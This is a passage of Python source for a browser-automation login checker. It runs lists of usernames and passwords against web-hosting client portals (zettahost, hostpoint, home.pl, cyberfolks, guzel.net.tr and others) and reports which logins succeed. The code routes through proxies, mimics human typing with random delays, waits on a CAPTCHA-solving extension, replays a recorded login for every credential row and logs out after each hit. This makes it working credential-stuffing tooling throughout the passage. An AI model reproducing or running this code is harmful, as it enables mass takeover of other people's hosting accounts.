            print(f"[GUZEL] Form fill failed: {error}")
            if debug:
                print(f"[GUZEL] Debug: {debug}")
            return f"ERROR: {error}"

        _random_delay(0.5, 1.0)

        # ── Step 3: Submit form via JavaScript ──────────────────────────────
        print("[GUZEL] Submitting form via JavaScript...")
        
        submit_result = page.evaluate("""
        () => {
            // Find submit button
            let submitBtn = document.querySelector('input#loginbutonu') ||
                           document.querySelector('input[type="submit"]') ||
                           document.querySelector('button[type="submit"]');
            
            if (!submitBtn) {
                return { success: false, error: 'Submit button not found' };
            }
            
            try {
                // Enable button if disabled
                submitBtn.disabled = false;
                
                // Try to find the form
                let form = submitBtn.closest('form');
                if (!form) {
                    return { success: false, error: 'Form element not found' };
                }
                
                console.log('Form action:', form.action);
                console.log('Form method:', form.method);
                
                // Submit the form directly
                form.submit();
                
                console.log('Form submitted');
                return { success: true };
            } catch (e) {
                return { success: false, error: e.message };
            }
        }
        """)
        
        print(f"[GUZEL] Submit result: {submit_result}")
        
        if not submit_result.get('success'):
            print(f"[GUZEL] Submit failed: {submit_result.get('error')}")
            # Try pressing Enter as fallback
            try:
                page.keyboard.press("Enter")
                print("[GUZEL] Tried Enter key as fallback")
            except Exception as e:
                print(f"[GUZEL] Enter key also failed: {e}")

        # Wait for navigation
        print("[GUZEL] Waiting for navigation or response...")
        _random_delay(1.0, 2.0)
        
        try:
            page.wait_for_load_state("networkidle", timeout=10_000)
        except PWTimeout:
            print("[GUZEL] Navigation timeout")
            pass

        _random_delay(1.0, 2.0)

        # ── Step 4: Evaluate result ────────────────────────────────────────
        final_url = page.url.lower()
        login_url = LOGIN_URL.lower()

        print(f"[GUZEL] Final URL: {final_url[:100]}")

        # Still on login page = failed
        if final_url.rstrip("/") == login_url.rstrip("/"):
            print("[GUZEL] Still on login page - checking for error messages")
            html = page.content().lower()
            if any(kw in html for kw in ["hatalı", "başarısız", "error", "invalid"]):
                print("[GUZEL] Error message detected = FAILED")
                return "FAILED"
            return "FAILED"

        # Redirected to clientarea = success
        if "clientarea" in final_url:
            print("[GUZEL] Redirected to clientarea = SUCCESS")
            return "SUCCESS"

        # Redirected away from dologin = likely success
        if "dologin" not in final_url and "login" not in final_url and "clientarea.php" not in final_url:
            print("[GUZEL] Redirected away from login page = SUCCESS")
            return "SUCCESS"

        # Unknown
        print("[GUZEL] Unclear result = UNKNOWN")
        return "UNKNOWN"

    except Exception as e:
        print(f"[GUZEL] Unexpected error: {type(e).__name__}: {e}")
        return f"ERROR: {type(e).__name__}: {str(e)[:60]}"


def try_login(
    entry: dict,
    custom_login_url: str = "",
    custom_success_url: str = "",
    success_url_exact: bool = True,
    headless: bool = True,
    timeout: int = 20,
    success_dom_selectors: str = "",
    custom_user_dom: str = "",    # HTML snippet → CSS selector for username field
    custom_pass_dom: str = "",    # HTML snippet → CSS selector for password field
    custom_submit_dom: str = "",  # HTML snippet → CSS selector for login button
    custom_logout_dom: str = "",  # HTML snippet → CSS selector for logout button
    custom_login_trigger_dom: str = "",  # HTML snippet → CSS selector for modal trigger
    custom_login_tab_dom: str = "",      # HTML snippet → CSS selector for "Login" tab
) -> str:
    """
    Attempt to log in using a real Chromium browser (Playwright).

    Parameters
    ----------
    entry              : dict  — keys: url, username, password
    custom_login_url   : str   — if set, navigate here instead of entry url / domain routing
    custom_success_url : str   — if set, check final URL against this to determine SUCCESS
    success_url_exact  : bool  — True = exact match (trailing slash ignored, case-insensitive)
                                  False = substring match (case-insensitive)
    headless           : bool  — False shows the browser window (useful for CAPTCHA)
    timeout            : int   — page navigation timeout in seconds

    Returns
    -------
    str  — one of: SUCCESS / FAILED / UNKNOWN / CAPTCHA / ERROR / UNREACHABLE
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return "ERROR: playwright not installed. Run: pip install playwright"

    url      = entry["url"]
    username = entry["username"]
    password = entry["password"]
    proxy    = _load_proxy()

    # If the user provided a custom login URL, use it and skip domain routing
    if custom_login_url:
        url = custom_login_url
        is_zettahost   = False
        is_ns1         = False
        is_hostpoint   = False
        is_home_pl     = False
        is_cyberfolks  = False
        is_guzel       = False
    else:
        domain = entry.get("domain", "").lower()
        # Always use the real login portal for superhosting entries
        if "superhosting" in domain or "superhosting" in url.lower():
            url = SUPERHOSTING_LOGIN_URL

        # Route zettahost entries to dedicated handler
        is_zettahost = "zettahost" in domain or "zettahost" in url.lower()

        # Route ns1.bg entries to dedicated handler
        is_ns1 = "ns1.bg" in domain or "ns1.bg" in url.lower()

        # Route hostpoint entries to dedicated handler
        is_hostpoint = "hostpoint" in domain or "hostpoint" in url.lower()

        # Route home.pl entries to dedicated handler
        is_home_pl = "home.pl" in domain or "panel.home.pl" in url.lower()

        # Route cyberfolks.pl entries to dedicated handler
        is_cyberfolks = "cyberfolks" in domain or "cyberfolks" in url.lower()

        # Route guzel.net.tr entries to dedicated handler
        is_guzel = "guzel" in domain or "guzel.net.tr" in url.lower()

    try:
        with sync_playwright() as pw:
            browser, context = _make_context(pw, headless=headless, proxy=proxy)
            page = context.new_page()

            try:
                # ---- Zettahost: use dedicated handler ----
                if is_zettahost:
                    return _try_login_zettahost(
                        page, context, username, password, timeout
                    )

                # ---- NS1.bg: use dedicated handler ----
                if is_ns1:
                    return _try_login_ns1(
                        page, context, username, password, timeout
                    )

                # ---- Hostpoint: use dedicated handler ----
                if is_hostpoint:
                    return _try_login_hostpoint(
                        page, context, username, password, timeout
                    )

                # ---- home.pl: use dedicated handler ----
                if is_home_pl:
                    return _try_login_home_pl(
                        page, context, username, password, timeout
                    )

                # ---- cyberfolks.pl: use dedicated handler ----
                if is_cyberfolks:
                    return _try_login_cyberfolks(
                        page, context, username, password, timeout
                    )

                # ---- guzel.net.tr: use dedicated handler ----
                if is_guzel:
                    return _try_login_guzel(
                        page, context, username, password, timeout
                    )

                # ---- Navigate to login page ----
                page.goto(url, timeout=timeout * 1000, wait_until="domcontentloaded")
                try:
                    page.wait_for_load_state("networkidle", timeout=min(timeout * 1000, 20_000))
                    print("[LOAD] Initial page network idle reached")
                except Exception:
                    print("[LOAD] Initial network idle timed out — continuing")
                _random_delay(0.4, 1.0)

                # ---- Dismiss any cookie / notification banner before form interaction ----
                _dismiss_overlays(page)

                html_before = page.content()

                # ---- Detect CAPTCHA before attempting login ----
                if _has_captcha(html_before):
                    if _use_captcha_extension:
                        # Extension is loaded — wait for it to solve automatically
                        solved = _wait_for_captcha_solve(page, timeout_sec=timeout * 4)
                        if not solved:
                            return "CAPTCHA (solver timed out)"
                        # Re-read page after solve (extension may have submitted the token)
                        html_before = page.content()
                    else:
                        return "CAPTCHA"

                # Resolve custom selectors early so modal-open logic can skip
                # trigger clicks when native fields are already visible.
                _cust_user_nm   = _resolve_custom_dom_selector(page, custom_user_dom, "user")
                _cust_pass_nm   = _resolve_custom_dom_selector(page, custom_pass_dom, "pass")
                _cust_submit_nm = _resolve_custom_dom_selector(page, custom_submit_dom, "submit")
                _cust_logout_nm = _resolve_custom_dom_selector(page, custom_logout_dom, "logout")
                _cust_trigger_nm = _resolve_custom_dom_selector(page, custom_login_trigger_dom, "login_trigger")
                _cust_tab_nm = _resolve_custom_dom_selector(page, custom_login_tab_dom, "login_tab")

                # ---- Open modal / dropdown if login form is not directly on the page ----
                # Some sites (e.g. akky.mx) hide the form behind a login button that
                # reveals a modal or dropdown overlay.  Try to trigger it now so that
                # the field-detection and fill steps below work normally.
                _try_open_login_modal(
                    page,
                    timeout_ms=timeout * 1_000,
                    custom_user_sel=_cust_user_nm,
                    custom_pass_sel=_cust_pass_nm,
                    custom_trigger_sel=_cust_trigger_nm,
                    custom_login_tab_sel=_cust_tab_nm,
                )

                # Re-read the page after the possible modal interaction
                html_before = page.content()

                # ---- Detect and fill form fields ----
                # Priority: user-specified DOM  >  session cache  >  auto-detect.
                # User-specified selectors (pasted HTML) are validated against the
                # live page with a single JS call before trusting them.
                def _dedup(lst):
                    
                    seen: set = set()
                    return [s for s in lst if not (s in seen or seen.add(s))]  # type: ignore

                _cached_submit_sel: str | None = _cust_submit_nm
                _cached = None if (_cust_user_nm and _cust_pass_nm) else _get_cached_selectors(url)

                if _cust_user_nm and _cust_pass_nm:
                    active_user_sel = _cust_user_nm
                    active_pass_sel = _cust_pass_nm
                    print(f"[NORMAL] Custom DOM: user={active_user_sel!r}  pass={active_pass_sel!r}")
                elif _cached:
                    _still_valid = _js_find_selector(page, [_cached.user_sel, _cached.pass_sel])
                    if _still_valid:
                        active_user_sel    = _cust_user_nm or _cached.user_sel
                        active_pass_sel    = _cust_pass_nm or _cached.pass_sel
                        _cached_submit_sel = _cust_submit_nm or _cached.submit_sel
                        print(f"[CACHE] Using cached selectors for {url}")
                    else:
                        print(f"[CACHE] Cached selectors stale for {url} — re-detecting")
                        _cached = None

                if not _cust_user_nm and not _cust_pass_nm and not _cached:
                    user_field, pass_field = _detect_fields_with_cache(html_before, url)
                    active_user_sel = _cust_user_nm or _js_find_selector(page, _dedup(
                        [f"input[name='{user_field}']"] + _USER_FIELD_SELECTORS))
                    active_pass_sel = _cust_pass_nm or _js_find_selector(page, _dedup(
                        [f"input[name='{pass_field}']"] + _PASS_FIELD_SELECTORS))
                    _found_submit   = _cust_submit_nm or _js_find_selector(page, _SUBMIT_SELECTORS)
                    _cached_submit_sel = _found_submit

                    if active_user_sel and active_pass_sel:
                        _set_cached_selectors(url, _FormSelectors(
                            user_sel   = active_user_sel,
                            pass_sel   = active_pass_sel,
                            submit_sel = _found_submit or "button[type='submit']",
                        ))

                if not active_user_sel:
                    return "UNKNOWN (no user field)"

                _type_human(page, active_user_sel, username)
                _random_delay(0.4, 1.0)

                if not active_pass_sel:
                    return "UNKNOWN (no pass field)"

                _type_human(page, active_pass_sel, password)
                _random_delay(0.5, 1.5)

                # ---- Submit — handle same-page navigation AND new tab/popup ----
                # Some sites open the post-login page in a new tab when the
                # login button is clicked. We use expect_popup + expect_navigation
                # simultaneously and take whichever fires first.
                submitted   = False
                result_page = page   # will be reassigned if a new tab opens

                def _do_submit():
                    """
                    Click the login submit button inside the (possibly modal) form.

                    Strategy (ordered by reliability for modal login forms):
                      1. Try cached selectors first (most successful for this domain)
                      2. Then try all known submit selectors (modal-scoped first)
                      3. Fall back to pressing Enter (last resort)
                    """
                    nonlocal submitted

                    # Use submit selector already confirmed during field detection.
                    # Validate it is still present on the page (single JS call),
                    # then re-scan if stale. Never uses per-selector timeout loops.
                    btn_sel = _cached_submit_sel
                    if btn_sel and not _js_find_selector(page, [btn_sel]):
                        print(f"[SUBMIT] Cached selector stale, re-scanning: {btn_sel}")
                        # Cached submit selector gone — re-scan once
                        btn_sel = _js_find_selector(page, _SUBMIT_SELECTORS)
                        _cached_submit_sel = btn_sel
                        # Update cache with fresh submit selector
                        c = _get_cached_selectors(url)
                        if c and btn_sel:
                            _set_cached_selectors(url, _FormSelectors(
                                user_sel=c.user_sel,
                                pass_sel=c.pass_sel,
                                submit_sel=btn_sel,
                            ))
                    elif not btn_sel:
                        btn_sel = _js_find_selector(page, _SUBMIT_SELECTORS)

                    if btn_sel:
                        try:
                            print(f"[SUBMIT] Clicking selector: {btn_sel}")
                            if not _click_first_non_social(page, btn_sel, timeout_ms=3_000):
                                raise RuntimeError("no safe non-social submit candidate")
                            submitted = True
                            return
                        except Exception as exc:
                            print(f"[SUBMIT] Click failed for {btn_sel}: {exc}")

                    # Last resort: Enter key
                    try:
                        print("[SUBMIT] Falling back to Enter key")
                        page.keyboard.press("Enter")
                        submitted = True
                    except Exception:
                        pass

                # Record current URL so we can detect redirect vs AJAX/SPA
                # after the login button is clicked.
                url_before  = page.url
                url_changed = False

                # Listen for a possible popup/new-tab BEFORE submitting
                new_tab_ms = min(timeout * 1000, 8_000)
                try:
                    with context.expect_page(timeout=new_tab_ms) as new_page_info:
                        _do_submit()
                    # A new tab was opened — always a redirect
                    result_page = new_page_info.value
                    result_page.wait_for_load_state("domcontentloaded",
                                                    timeout=timeout * 1000)
                    url_changed = True
                except PWTimeout:
                    # No new tab — wait for same-page navigation,
                    # then compare URLs to decide which case we're in.
                    try:
                        page.wait_for_load_state("domcontentloaded",
                                                  timeout=timeout * 1000)
                    except PWTimeout:
                        pass
                    url_changed = (page.url != url_before)
                except Exception:
                    url_changed = (page.url != url_before)


                if url_changed:
                    # ── REDIRECT PATH ──────────────────────────────────────────
                    # Server sent a full page redirect after login.
                    # Page is (mostly) already loaded; just let it finish.
                    try:
                        result_page.wait_for_load_state("networkidle", timeout=3_000)
                    except PWTimeout:
                        pass
                    _random_delay(0.3, 0.8)
                else:
                    # ── AJAX / SPA PATH ────────────────────────────────────────
                    # Login was sent via XHR/fetch — no page navigation happened.
                    # Wait for the in-flight request to complete and the JS
                    # framework to update the DOM.
                    try:
                        result_page.wait_for_load_state("networkidle", timeout=8_000)
                    except PWTimeout:
                        pass
                    time.sleep(0.5)   # brief DOM-render settle

                    # --- SPA login failure handling ---
                    # If there is no target-object (success DOM selector) and URL did not change, close after 2s
                    spa_success_selectors = _parse_success_dom_selectors(success_dom_selectors)
                    has_target_object = False
                    if spa_success_selectors:
                        has_target_object = _check_success_dom(result_page, spa_success_selectors)
                    if not has_target_object:
                        import time as _spa_time
                        _spa_time.sleep(2)
                        try:
                            result_page.close()
                        except Exception:
                            pass

                html_after = result_page.content()
                final_url  = result_page.url
                # ---- Check for CAPTCHA on result page ----
                if _has_captcha(html_after):
                    if _use_captcha_extension:
                        solved = _wait_for_captcha_solve(result_page, timeout_sec=timeout * 4)
                        if not solved:
                            return "CAPTCHA (solver timed out)"
                        # Re-read after solve
                        html_after = result_page.content()
                        final_url  = result_page.url
                    else:
                        return "CAPTCHA"

                # ---- Determine result ----
                # Priority 1: User-supplied success DOM selectors
                _dom_sels = _parse_success_dom_selectors(success_dom_selectors)
                if _dom_sels and _check_success_dom(result_page, _dom_sels):
                    result = "SUCCESS"
                elif custom_success_url:
                    # User-supplied success URL: exact or substring match
                    su = custom_success_url.lower().rstrip("/")
                    fu = final_url.lower().rstrip("/")
                    matched = (su == fu) if success_url_exact else (su in fu)
                    if matched:
                        result = "SUCCESS"
                    elif custom_login_url and custom_login_url.lower() in final_url.lower():
                        result = "FAILED"
                    else:
                        result = f"UNKNOWN (landed on: {final_url[:80]})"
                else:
                    # For redirect logins URL comparison is reliable.
                    # For AJAX/SPA logins the URL did not change, so passing an
                    # empty login_url tells _evaluate_result_advanced to skip the
                    # "URL unchanged → FAILED" shortcut and rely purely on DOM
                    # analysis (error alerts, password field visibility, toasts,
                    # success/failure keywords) instead.
                    result = _evaluate_result_advanced(
                        html_after, final_url,
                        login_url=url if url_changed else "",
                        page=result_page,
                        verbose=False,
                    )
                if "SUCCESS" in result:
                    if _cust_logout_nm and _js_find_selector(result_page, [_cust_logout_nm]):
                        try:
                            result_page.click(_cust_logout_nm, timeout=3_000)
                        except Exception:
                            pass
                        try:
                            context.clear_cookies()
                        except Exception:
                            pass
                    else:
                        _logout_and_clear(result_page, context,
                                          timeout_ms=timeout * 1000)

                return result

            finally:
                _cleanup_context(context)
                if browser:
                    browser.close()

    except Exception as e:
        err = str(e).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE"
        if "timeout" in err:
            return "TIMEOUT"
        return f"ERROR: {type(e).__name__}: {str(e)[:80]}"


# ---------------------------------------------------------------------------
# Record & Replay — record your manual login once, replay for every row
# ---------------------------------------------------------------------------

# Sentinel strings written into the recipe so replay can substitute them
_USER_SENTINEL = "%%USERNAME%%"
_PASS_SENTINEL = "%%PASSWORD%%"


def load_recipe() -> dict | None:
    """Return the saved recipe dict, or None if it doesn't exist."""
    if RECIPE_FILE.exists():
        try:
            return json.loads(RECIPE_FILE.read_text(encoding="utf-8"))
        except Exception:
            return None
    return None


def clear_recipe() -> None:
    if RECIPE_FILE.exists():
        RECIPE_FILE.unlink()


def recipe_exists() -> bool:
    return RECIPE_FILE.exists()


def record_login_actions(
    url: str,
    username_hint: str = "",
    password_hint: str = "",
    on_status=None,  # optional callable(str) for live status messages
) -> str:
    """
    Open a visible Chrome window at *url* and inject a JS spy that records
    every user action (clicks, typing, navigation) as a JSON recipe.

    The recording captures:
      - goto     : the URL navigated to at start
      - fill     : selector + value (username/password replaced with sentinels)
      - click    : selector of the element clicked
      - navigate : any URL change after form submit

    The resulting recipe is saved to login_recipe.json and can be replayed
    automatically for every credential via try_login_recorded().

    Parameters
    ----------
    url            : login page URL to open
    username_hint  : the real username typed during recording — replaced with
                     %%USERNAME%% in the recipe so replay injects each row's own
    password_hint  : same for password → %%PASSWORD%%
    on_status      : optional callable(str) for live status messages to the GUI
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return "ERROR: playwright not installed."

    def _status(msg: str):
        if on_status:
            on_status(msg)

    steps: list[dict] = []
    _lock = threading.Lock()
    _watched_pages: set = set()

    def _attach_spy(page):
        """Inject the recording spy into a page."""
        if id(page) in _watched_pages:
            return
        _watched_pages.add(id(page))

        def _record_step(step_json: str):
            try:
                step = json.loads(step_json)
                # Replace real credentials with sentinels
                if step.get("type") == "fill":
                    val = step.get("value", "")
                    if username_hint and val == username_hint:
                        step["value"] = _USER_SENTINEL
                    elif password_hint and val == password_hint:
                        step["value"] = _PASS_SENTINEL
                    elif step.get("field_type") == "password":
                        step["value"] = _PASS_SENTINEL
                with _lock:
                    steps.append(step)
            except Exception:
                pass

        try:
            page.expose_function("__recordStep__", _record_step)
        except Exception:
            pass

        spy_js = """
() => {
    if (window.__recorderActive__) return;
    window.__recorderActive__ = true;

    function bestSelector(el) {
        if (!el || el === document.body) return 'body';
        if (el.id) return '#' + CSS.escape(el.id);
        if (el.name) return el.tagName.toLowerCase() + '[name=' + JSON.stringify(el.name) + ']';
        if (el.type === 'submit' || el.type === 'button')
            return el.tagName.toLowerCase() + '[type=' + JSON.stringify(el.type) + ']';
        let classes = Array.from(el.classList).slice(0, 2).join('.');
        if (classes) return el.tagName.toLowerCase() + '.' + classes;
        return el.tagName.toLowerCase();
    }

    document.addEventListener('change', function(e) {
        let el = e.target;
        if (!['INPUT','SELECT','TEXTAREA'].includes(el.tagName)) return;
        window.__recordStep__(JSON.stringify({
            type: 'fill',
            selector: bestSelector(el),
            value: el.value,
            field_type: el.type || 'text'
        }));
    }, true);

    document.addEventListener('click', function(e) {
        let el = e.target;
        let tag = el.tagName.toLowerCase();
        if (!['button','input','a','label'].includes(tag)) return;
        window.__recordStep__(JSON.stringify({
            type: 'click',
            selector: bestSelector(el),
            tag: tag
        }));
    }, true);
}
"""
        try:
            page.add_init_script(spy_js)
            page.evaluate(spy_js)
        except Exception:
            pass

    try:
        with sync_playwright() as pw:
            browser, context = _make_context(
                pw, headless=False, proxy=None
            )
            context.on("page", _attach_spy)
            page = context.new_page()
            _attach_spy(page)

            with _lock:
                steps.append({"type": "goto", "url": url})

            _status(
                f"Recording started — perform your login on the opened browser, "
                f"then close it when done."
            )

            try:
                page.goto(url, timeout=30_000, wait_until="domcontentloaded")
            except Exception:
                pass

            _prev_url = url
            while browser.is_connected():
                try:
                    page.wait_for_timeout(400)
                    cur = page.url
                    if cur and cur != _prev_url:
                        with _lock:
                            steps.append({"type": "navigate", "url": cur})
                        _attach_spy(page)
                        _prev_url = cur
                except Exception:
                    break

            try:
                save_session(context)
            except Exception:
                pass
            _cleanup_context(context)
            try:
                if browser:
                    browser.close()
            except Exception:
                pass

        recipe = {
            "version": 1,
            "start_url": url,
            "steps": steps,
        }
        RECIPE_FILE.write_text(
            json.dumps(recipe, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
        _status(f"Recipe saved — {len(steps)} actions recorded.")
        return f"Recipe saved — {len(steps)} actions recorded."

    except Exception as e:
        return f"ERROR: {type(e).__name__}: {str(e)[:120]}"


def try_login_recorded(
    entry: dict,
    custom_login_url: str = "",
    custom_success_url: str = "",
    success_url_exact: bool = True,
    timeout: int = 20,
    success_dom_selectors: str = "",
) -> str:
    """
    Replay the recorded login recipe (login_recipe.json) for *entry*,
    substituting %%USERNAME%% / %%PASSWORD%% with the real credentials.

    If custom_login_url is provided it overrides the recipe's start_url.
    If custom_success_url is provided it is used to determine SUCCESS/FAILED
    by checking the final page URL instead of keyword analysis.

    Returns SUCCESS / FAILED / UNKNOWN / CAPTCHA / ERROR like try_login().
    """
    recipe = load_recipe()
    if recipe is None:
        return "ERROR: No recipe recorded. Use 'Record Login' first."

    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return "ERROR: playwright not installed."

    username = entry.get("username", "")
    password = entry.get("password", "")
    proxy    = _load_proxy()

    def _inject(value: str) -> str:
        return value.replace(_USER_SENTINEL, username).replace(_PASS_SENTINEL, password)

    try:
        with sync_playwright() as pw:
            browser, context = _make_context(pw, headless=True, proxy=proxy)
            page = context.new_page()

            try:
                first_goto    = True
                actual_login_url = custom_login_url  # track the URL we actually navigate to first
                for step in recipe.get("steps", []):
                    stype = step.get("type")

                    if stype == "goto":
                        # Override start URL if the user specified a custom login URL
                        nav_url = (custom_login_url if (custom_login_url and first_goto)
                                   else step["url"])
                        if first_goto:
                            actual_login_url = nav_url   # remember actual first nav URL
                        first_goto = False
                        try:
                            page.goto(nav_url, timeout=timeout * 1000,
                                      wait_until="domcontentloaded")
                            _random_delay(0.6, 1.2)
                        except PWTimeout:
                            pass

                    elif stype == "fill":
                        sel = step.get("selector", "")
                        val = _inject(step.get("value", ""))
                        if not sel:
                            continue
                        try:
                            page.wait_for_selector(sel, timeout=8_000,
                                                   state="visible")
                            page.fill(sel, "")
                            _random_delay(0.2, 0.5)
                            page.type(sel, val, delay=random.randint(50, 130))
                            _random_delay(0.3, 0.7)
                        except Exception:
                            try:
                                page.fill(sel, val)
                            except Exception:
                                pass

                    elif stype == "click":
                        sel = step.get("selector", "")
                        if not sel:
                            continue
                        try:
                            page.wait_for_selector(sel, timeout=8_000,
                                                   state="visible")
                            _random_delay(0.2, 0.5)
                            try:
                                with page.expect_navigation(
                                    timeout=timeout * 1000,
                                    wait_until="domcontentloaded",
                                ):
                                    page.click(sel)
                            except PWTimeout:
                                try:
                                    page.click(sel)
                                except Exception:
                                    pass
                            try:
                                page.wait_for_load_state("networkidle",
                                                         timeout=5_000)
                            except PWTimeout:
                                pass
                            _random_delay(0.5, 1.2)
                        except Exception:
                            pass

                    # "navigate" steps are informational — skip during replay

                html      = page.content()
                final_url = page.url

                if "captcha" in html.lower() or "recaptcha" in html.lower():
                    return "CAPTCHA"

                # Priority 1: User-supplied success DOM selectors
                _dom_sels = _parse_success_dom_selectors(success_dom_selectors)
                if _dom_sels and _check_success_dom(page, _dom_sels):
                    result = "SUCCESS"
                elif custom_success_url:
                    su = custom_success_url.lower().rstrip("/")
                    fu = final_url.lower().rstrip("/")
                    matched = (su == fu) if success_url_exact else (su in fu)
                    if matched:
                        result = "SUCCESS"
                    elif custom_login_url and custom_login_url.lower() in final_url.lower():
                        result = "FAILED"
                    else:
                        result = f"UNKNOWN (landed on: {final_url[:80]})"
                else:
                    result = _evaluate_result(
                        html, final_url,
                        login_url=actual_login_url,
                        page=page,
                    )

                if "SUCCESS" in result:
                    _logout_and_clear(page, context, timeout_ms=timeout * 1000)
                return result

            finally:
                _cleanup_context(context)
                if browser:
                    browser.close()

    except Exception as e:
        err = str(e).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE"
        if "timeout" in err:
            return "TIMEOUT"
        return f"ERROR: {type(e).__name__}: {str(e)[:80]}"


# ---------------------------------------------------------------------------
# Interactive mode — visible Chrome, app fills creds, user handles CAPTCHA
# ---------------------------------------------------------------------------

# Ordered candidate selectors for username fields (most-specific first).
# BeautifulSoup detection tells us the name= attribute; these are fallbacks.
_USER_FIELD_SELECTORS = [
    "div.login-card input#inputEmail",
    # Exact ID selectors (most specific)
    "input#inputEmail",
    "input#inputUsername",
    "input#inputUser",
    "input#inputLogin",
    # Input groups with nested structure (HTML) 
    ".input-group input[type='email']",
    ".input-group input[type='text']:not([type='hidden'])",
    ".form-group input[type='email']",
    ".form-group input[type='text']:not([type='hidden'])",
    # Common name-based selectors
    "input[name='email']",
    "input[name='login_email']",
    "input[name='username']",
    "input[name='userName']",
    "input[name='login']",
    "input[name='user']",
    "input[name='client']",        # zettahost-style
    "input[name='loginName']",
    "input[name='userLogin']",
    "input[name='user_login']",
    "input[name='user_email']",
    "input[name='_username']",     # Symfony-style (e.g. sprintdatacenter)
    # Type-based selectors (broad, used as fallback)
    "input[type='email']",
    "input[id='email']",
    "input[id='username']",
    "input[id='login']",
    "input[id='user']",
    "input[id='user_login']",
    "input[id='loginName']",
    "input[type='text']",          # broad fallback — last resort
]

_PASS_FIELD_SELECTORS = [
    # Exact ID selectors (most specific)
    "div.login-card input#inputPassword",
    "input#inputPassword",
    "input#inputPass",
    "input#inputPwd",
    # Input groups with nested structure
    ".input-group input[type='password']",
    ".form-group input[type='password']",
    # Common name-based selectors
    "input[name='password']",
    "input[name='login_pass']",
    "input[name='passwd']",
    "input[name='pass']",
    "input[name='pwd']",
    "input[name='user_pass']",
    "input[name='_password']",     # Symfony-style (e.g. sprintdatacenter)
    # Type-based selector (always works as final fallback)
    "input[type='password']",      # always works as final fallback
]

_SUBMIT_SELECTORS = [
    # ── Exact ID selectors (highest priority) ─────────────────────────────
    "div.login-card input#loginbutonu",
    "input#loginbutonu",           # guzel.net.tr
    "input#login",
    "input#submit",
    "button#login",
    "button#submit",
    "button#loginbutonu",
    "div.btn_sumbit input[type='image']",
    # ── Modal-scoped selectors ─────────────────────────────────────────────
    # Tried first so that when a login form lives inside a modal/dialog the
    # correct button is clicked rather than an unrelated button on the page.
    "input[id='login']",
    "input[name='wp-submit']",
    "[role='dialog'] button[type='submit']",
    "[role='dialog'] input[type='submit']",
    "[aria-modal='true'] button[type='submit']",
    "[aria-modal='true'] input[type='submit']",
    ".modal button[type='submit']",
    ".modal input[type='submit']",
    ".modal-content button[type='submit']",
    ".modal-body button[type='submit']",
    ".modal-footer button[type='submit']",
    # Modal buttons without explicit type (common in SPAs — type defaults to
    # "submit" inside a <form> but many frameworks omit the attribute)
    "[role='dialog'] form button",
    "[aria-modal='true'] form button",
    ".modal form button",
    ".modal-content form button",
    # Modal submit by text (English)
    "[role='dialog'] button:has-text('Login')",
    "[role='dialog'] button:has-text('Log in')",
    "[role='dialog'] button:has-text('Sign in')",
    "[role='dialog'] button:has-text('Submit')",
    # Modal submit by text (Spanish)
    "[role='dialog'] button:has-text('Iniciar sesión')",
    "[role='dialog'] button:has-text('Ingresar')",
    "[role='dialog'] button:has-text('Entrar')",
    "[role='dialog'] button:has-text('Iniciar')",
    # Modal submit by text (Polish)
    "[role='dialog'] button:has-text('Zaloguj się')",
    "[role='dialog'] button:has-text('Zaloguj')",
    # Modal submit by text (Bulgarian)
    "[role='dialog'] button:has-text('Вход')",
    "[role='dialog'] button:has-text('Влез')",
    # Modal submit by text (Turkish)
    "[role='dialog'] button:has-text('Giriş')",
    "[role='dialog'] button:has-text('Giriş Yap')",
    "[role='dialog'] button:has-text('Oturum Aç')",
    # ── Page-level / general selectors ────────────────────────────────────
    "form button[type='submit']",
    "form input[type='submit']",
    "form button:not([type])",
    "button[type='submit']",
    "input[type='submit']",
    # Nested in form groups / divs (common pattern)
    ".form-group button[type='submit']",
    ".form-group input[type='submit']",
    ".btn-group button[type='submit']",
    ".btn-group input[type='submit']",
    # Button text selectors (English)
    "button:has-text('Login')",
    "button:has-text('Log in')",
    "button:has-text('Log In')",
    "button:has-text('Sign in')",
    "button:has-text('Sign In')",
    # Polish
    "button:has-text('Zaloguj się')",
    "button:has-text('Zaloguj sie')",
    "button:has-text('Zaloguj')",
    "input[value='Zaloguj się']",
    "input[value='Zaloguj']",
    # Bulgarian
    "button:has-text('Вход')",
    "button:has-text('Влез')",
    "button:has-text('Войди')",
    # Spanish / Latin-American
    "button:has-text('Iniciar sesión')",
    "button:has-text('Iniciar Sesión')",
    "form button:has-text('Ingresar')",
    "form button:has-text('Entrar')",
    "form button:has-text('Iniciar')",
    # Turkish
    "button:has-text('Giriş')",
    "button:has-text('Giriş Yap')",
    "button:has-text('Oturum Aç')",
    "input[value='Giriş']",
    "input[value='Giriş Yap']",
    # Generic
    "button:has-text('Submit')",
    "button:has-text('Connexion')",  # French
    "button:has-text('Anmelden')",   # German
    "form button",                   # any button inside a form
]

_CAPTCHA_RETRY_PHRASES = [
    "please complete the captcha",
    "complete the captcha",
    "solve the captcha",
    "verify you are human",
    "please verify",
    "security check",
    # Bulgarian
    "моля, попълнете captcha",
    "потвърдете, че сте човек",
    # Polish
    "potwierdź, że nie jesteś robotem",
    "rozwiąż captcha",
    "weryfikacja bezpieczeństwa",
]

# ---------------------------------------------------------------------------
# Form-selector cache  — detected ONCE per login URL, reused for every cred
# ---------------------------------------------------------------------------

@dataclasses.dataclass
class _FormSelectors:
    user_sel:   str
    pass_sel:   str
    submit_sel: str

_form_cache: dict[str, _FormSelectors] = {}
_form_cache_lock = threading.Lock()


def clear_form_cache() -> None:
    """Clear cached form selectors (call when the login URL changes)."""
    with _form_cache_lock:
        _form_cache.clear()
    print("[CACHE] Form selector cache cleared")


def _get_cached_selectors(login_url: str) -> "_FormSelectors | None":
    """Return cached selectors for *login_url*, or None if not yet detected."""
    with _form_cache_lock:
        return _form_cache.get(login_url)


def _set_cached_selectors(login_url: str, sel: _FormSelectors) -> None:
    with _form_cache_lock:
        _form_cache[login_url] = sel
    print(f"[CACHE] Selectors cached for {login_url}")


# ---------------------------------------------------------------------------
# Shared persistent browser pool
#
# When all credentials target the same login portal the most expensive work
# per credential is:
#   1. Launching a Chromium process      (~0.5–1 s)
#   2. Navigating to the login URL       (~1–3 s)
